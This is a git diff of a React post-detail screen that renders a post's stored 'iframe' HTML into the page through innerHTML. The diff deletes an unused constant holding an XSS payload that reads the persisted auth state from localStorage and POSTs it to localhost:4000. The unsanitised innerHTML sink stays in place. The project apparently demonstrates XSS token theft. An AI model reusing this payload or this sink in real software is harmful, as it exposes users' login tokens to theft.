@@ -4,9 +4,8 @@ import ScreenBase from "../ScreenBase";
 import { useParams } from "react-router-dom";
 import { PostFullType, requestPostById } from "../../api/posts";
 
-const chckc = `<iframe srcDoc="<script>fetch('http://localhost:4000', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(JSON.parse(JSON.parse(localStorage.getItem('persist:root')).auth))})</script>"></iframe>`;
-
 const PostDetailScreen: React.FC = () => {
+  const [isReady, setIsReady] = React.useState(false);
   const divRef = React.useRef<HTMLDivElement>(null);
   const param = useParams<{ id: string }>();
   const [postContent, setPostContent] = React.useState<PostFullType>();
@@ -15,15 +14,21 @@ const PostDetailScreen: React.FC = () => {
     const getPostData = async () => {
       if (!param.id) return;
 
-      const postRawData = await requestPostById(param.id);
-      setPostContent(postRawData);
-
-      if (divRef.current && postRawData.iframe) {
-        divRef.current.innerHTML = postRawData.iframe;
-      }
+      return await requestPostById(param.id);
     };
-    getPostData();
-  }, [param.id]);
+
+    const response = getPostData();
+    if (!response) return;
+
+    response.then((data) => {
+      setPostContent(data);
+      setIsReady(true);
+    });
+
+    if (isReady && postContent?.iframe) {
+      divRef.current!.innerHTML = postContent.iframe;
+    }
+  }, [isReady, param.id, postContent?.iframe]);
 
   return (
     <ScreenBase>
@@ -32,7 +37,7 @@ const PostDetailScreen: React.FC = () => {
         flexDirection={"column"}
         alignItems={"center"}
       >
-        {postContent?.iframe && <div ref={divRef}></div>}
+        <div ref={divRef}></div>
         {postContent && (
           <>
             <Box
